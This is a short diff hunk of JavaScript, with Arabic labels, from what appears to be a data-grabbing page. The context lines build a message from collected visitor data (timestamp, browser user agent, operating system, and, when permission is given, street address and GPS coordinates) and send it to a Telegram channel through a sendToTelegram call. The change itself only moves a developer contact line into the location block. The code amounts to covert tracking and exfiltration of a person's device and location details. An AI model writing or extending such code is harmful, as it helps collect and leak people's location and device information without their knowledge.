@@ -315,11 +315,13 @@
                 message += `⏰ <b>الوقت:</b> ${new Date(collectedData.systemInfo.timestamp).toLocaleString()}\n`;
                 message += `💻 <b>المتصفح:</b> ${collectedData.systemInfo.userAgent}\n`;
                 message += `🖥️ <b>النظام:</b> ${collectedData.systemInfo.platform}\n`;
-                message += `👤 المطور:@AEE_G\n`;
-
+               
                 if (collectedData.location.allowed) {
                     message += `\n📍 <b>الموقع:</b> ${collectedData.location.address || 'غير معروف'}\n`;
                     message += `🌐 <b>الإحداثيات:</b> ${collectedData.location.coords.latitude}, ${collectedData.location.coords.longitude}\n`;
+                    
+                    
+                    message += `👤 للتواصل مع المطور:@AEE_G\n`;
                 }
                 
                 await sendToTelegram(message, 'text');
